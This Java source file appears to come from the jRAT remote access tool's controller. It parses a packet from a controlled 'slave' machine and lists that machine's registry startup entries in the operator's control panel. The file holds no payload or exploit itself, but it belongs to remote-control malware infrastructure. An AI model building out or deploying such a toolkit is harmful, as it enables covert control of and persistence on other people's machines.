package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FrameControlPanel;
import io.jrat.client.ui.panels.PanelControlRegStart;

import java.io.DataInputStream;


public class Packet53RegistryStartup extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int count = slave.readInt();
		String[] args = new String[count];
		for (int i = 0; i < count; i++) {
			args[i] = slave.readLine();
		}

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null && count == 3) {
			PanelControlRegStart panel = (PanelControlRegStart) frame.panels.get("registry startup");
			panel.getModel().addRow(new Object[] { panel.icon, args[0], args[1], args[2] });
		}
	}

}
